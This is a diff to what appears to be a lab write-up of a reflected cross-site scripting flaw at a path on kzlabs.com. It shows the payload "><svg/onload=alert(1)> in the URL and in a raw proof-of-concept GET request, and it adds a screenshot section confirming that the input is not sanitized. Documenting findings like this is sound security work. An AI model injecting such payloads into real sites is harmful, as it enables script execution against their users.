@@ -21,7 +21,13 @@ https://kzlabs.com/58.php/account/%22%3E%3Csvg/onload=alert(1)%3E/messages
 ## Payload Used
 "><svg/onload=alert(1)>
 
-## Proof of Concept Request
+# Proof of Concept
+
+## Screenshot 1 — Successful execution of the injected XSS payload
+
+![XSS Execution](screenshots/lab58.png)
+
+This confirms that user-controlled input is rendered without proper sanitization or output encoding.
 
 http
 GET /58.php/account/"><svg/onload=alert(1)>/messages HTTP/1.1
